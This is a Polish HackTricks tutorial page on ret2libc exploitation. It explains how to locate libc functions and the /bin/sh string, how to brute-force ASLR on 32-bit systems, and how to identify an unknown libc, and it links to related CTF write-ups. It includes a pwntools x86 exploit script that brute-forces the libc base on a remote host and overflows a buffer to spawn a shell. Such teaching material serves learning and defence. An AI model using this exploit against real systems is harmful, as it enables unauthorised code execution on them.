# Ret2lib

{% hint style="success" %}
Ucz się i praktykuj Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i praktykuj Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Podstawowe informacje**

Istotą **Ret2Libc** jest przekierowanie przepływu wykonania podatnego programu do funkcji w bibliotece współdzielonej (np. **system**, **execve**, **strcpy**) zamiast wykonywania kodu shellcode dostarczonego przez atakującego na stosie. Atakujący tworzy ładunek, który modyfikuje adres powrotu na stosie wskazujący na pożądaną funkcję biblioteczną, jednocześnie zapewniając, że wszelkie konieczne argumenty są poprawnie ustawione zgodnie z konwencją wywołania.

### **Przykładowe kroki (uproszczone)**

* Uzyskaj adres funkcji do wywołania (np. system) i polecenie do wywołania (np. /bin/sh)
* Wygeneruj łańcuch ROP, aby przekazać pierwszy argument wskazujący na łańcuch polecenia i przepływ wykonania do funkcji

## Znajdowanie adresów

* Przyjmując, że używana jest biblioteka `libc` z bieżącej maszyny, można znaleźć, gdzie zostanie załadowana w pamięci za pomocą:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Jeśli chcesz sprawdzić, czy ASLR zmienia adres libc, możesz to zrobić:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Znając używaną bibliotekę libc, można również znaleźć przesunięcie do funkcji `system` za pomocą:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Znając używaną bibliotekę libc, można również znaleźć przesunięcie do funkcji łańcucha `/bin/sh` za pomocą:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Korzystając z gdb-peda / GEF

Znając używaną bibliotekę libc, można również użyć Peda lub GEF, aby uzyskać adres funkcji **system**, funkcji **exit** oraz ciągu znaków **`/bin/sh`**:
```bash
p system
p exit
find "/bin/sh"
```
### Korzystanie z /proc/\<PID>/maps

Jeśli proces tworzy **dzieci** za każdym razem, gdy z nim rozmawiasz (serwer sieciowy), spróbuj **odczytać** ten plik (prawdopodobnie będziesz musiał być rootem).

Tutaj możesz znaleźć **dokładnie, gdzie jest załadowany libc** wewnątrz procesu i **gdzie będzie załadowany** dla każdego dziecka procesu.

![](<../../../.gitbook/assets/image (853).png>)

W tym przypadku jest załadowany pod adresem **0xb75dc000** (Będzie to adres bazowy libc)

## Nieznany libc

Może być możliwe, że **nie znasz libc, które jest ładowane przez binarny plik** (ponieważ może znajdować się na serwerze, do którego nie masz dostępu). W takim przypadku możesz wykorzystać podatność do **wycieku pewnych adresów i znalezienia, który libc** jest używany:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

A szablon pwntools do tego znajdziesz tutaj:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Znany libc z 2 przesunięciami

Sprawdź stronę [https://libc.blukat.me/](https://libc.blukat.me/) i użyj **kilku adresów** funkcji wewnątrz libc, aby dowiedzieć się, która **wersja jest używana**.

## Omijanie ASLR w systemach 32-bitowych

Te ataki brute-force są **przydatne tylko dla systemów 32-bitowych**.

* Jeśli exploit jest lokalny, możesz spróbować przeprowadzić atak brute-force na adres bazowy libc (przydatne dla systemów 32-bitowych):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Jeśli atakujesz zdalny serwer, możesz spróbować **przeprowadzić atak siłowy na adres funkcji `usleep` z biblioteki `libc`**, przekazując jako argument 10 (na przykład). Jeśli w pewnym momencie **serwer zajmuje dodatkowe 10 sekund na odpowiedź**, oznacza to, że znalazłeś adres tej funkcji.

## One Gadget

Wykonaj powłokę, skacząc tylko do **jednego** konkretnego **adresu** w bibliotece `libc`:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## Przykład kodu x86 Ret2lib

W tym przykładzie atak siłowy ASLR jest zintegrowany w kodzie, a podatny plik binarny znajduje się na zdalnym serwerze:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## Przykład kodu x64 Ret2lib

Sprawdź przykład z:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## Przykład ARM64 Ret2lib

W przypadku ARM64 instrukcja ret skacze tam, gdzie wskazuje rejestr x30, a nie tam, gdzie wskazuje rejestr stosu. Jest to nieco bardziej skomplikowane.

Ponadto w ARM64 instrukcja wykonuje to, co ma wykonać (niemożliwe jest skakanie w środek instrukcji i przekształcanie ich w nowe).

Sprawdź przykład z:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (lub puts)

To pozwala na **wyciek informacji z procesu** poprzez wywołanie `printf`/`puts` z określonymi danymi umieszczonymi jako argument. Na przykład umieszczenie adresu `puts` w GOT podczas wywołania `puts` spowoduje **wyciek adresu `puts` w pamięci**.

## Ret2printf

Oznacza to w zasadzie nadużycie **Ret2lib w celu przekształcenia go w podatność na łańcuchy formatujące `printf`** poprzez użycie `ret2lib` do wywołania printf z wartościami do jej wykorzystania (brzmi bezużytecznie, ale jest to możliwe):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Inne przykłady i odnośniki

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, mając wyciek do adresu funkcji w libc, używając jednego gadżetu
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bity, włączony ASLR, ale brak PIE, pierwszym krokiem jest zapełnienie przepełnienia aż do bajtu 0x00 canary, a następnie wywołanie puts i wyciek. Z canary tworzony jest gadżet ROP do wywołania puts w celu wycieku adresu puts z GOT, a następnie gadżet ROP do wywołania `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bity, włączony ASLR, brak canary, przepełnienie stosu w funkcji głównej z funkcji potomnej. Gadżet ROP do wywołania puts w celu wycieku adresu puts z GOT, a następnie wywołanie jednego gadżetu.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bity, brak PIE, brak canary, brak relro, nx. Używa funkcji write do wycieku adresu write (libc) i wywołuje jeden gadżet.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Używa łańcucha formatującego do wycieku canary ze stosu i przepełnienia buforu do wywołania systemu (jest w GOT) z adresem `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bity, brak relro, brak canary, nx, pie. Nadużywa złego indeksowania do wycieku adresów libc i sterty ze stosu. Nadużywa przepełnienie buforu do wykonania ret2lib wywołującego `system('/bin/sh')` (adres sterty jest potrzebny do ominięcia sprawdzenia).
